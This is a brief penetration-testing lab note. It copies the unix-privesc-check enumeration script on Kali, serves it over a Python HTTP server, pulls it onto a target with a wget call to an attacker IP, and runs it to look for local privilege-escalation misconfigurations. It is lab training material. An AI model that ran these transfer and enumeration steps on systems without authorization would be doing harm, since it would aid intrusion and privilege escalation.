

 This Bash script is pre-installed on our local Kali machine at /usr/bin/unix-privesc-check, and it performs a number of checks to find any system misconfigurations that can be abused for local privilege escalation.

```
cp /usr/bin/unix-privesc-check .
```


Exposing the file
```
┌──(kali㉿kali)-[~/Relia/245]
└─$ python3 -m http.server 80
```
Moving the file
```
wget 192.168.45.175/unix-privesc-check -O unix-privesc-check
```

Run it
```
./unix-privesc-check standard > output.txt
```
